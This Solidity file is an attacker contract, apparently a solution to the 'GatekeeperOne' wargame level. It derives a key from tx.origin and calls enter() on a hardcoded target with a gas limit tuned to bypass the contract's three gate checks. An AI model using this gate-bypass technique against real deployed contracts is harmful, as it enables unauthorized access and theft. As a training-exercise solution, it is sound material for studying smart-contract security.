// SPDX-License-Identifier: MIT
pragma solidity ^0.8.*;

// Gate 1: use a contract
// Gate 2: keep the gas left a product of 8191
// Gate 3: the bottom 32 bits must be equal to the bottom 16 ones + padding on the left;
//         at least one of the top 32 bits must be different from 0; 
//         the bottom 16 bits are tx.origin ones;

contract Gatekeeper1 {

    address target = 0xb2fc2Ae9b883935Ec846f4ac1e2dcDF9148f5359;
    event TestBool(bool);
    event TestUint(uint256);

    function attack_gate() public {

        bytes8 key = bytes8(uint64(uint32(uint16(uint160(tx.origin))) + 2**32));

        require(uint32(uint64(key)) == uint16(uint64(key)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(key)) != uint64(key), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(key)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");

        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", key);
        emit TestUint(gasleft());
        uint gaslimit = 8191*3 + 256;
        (bool success, ) = target.call{gas:gaslimit}(payload);
        success;
        //emit TestBool(success);
    }
}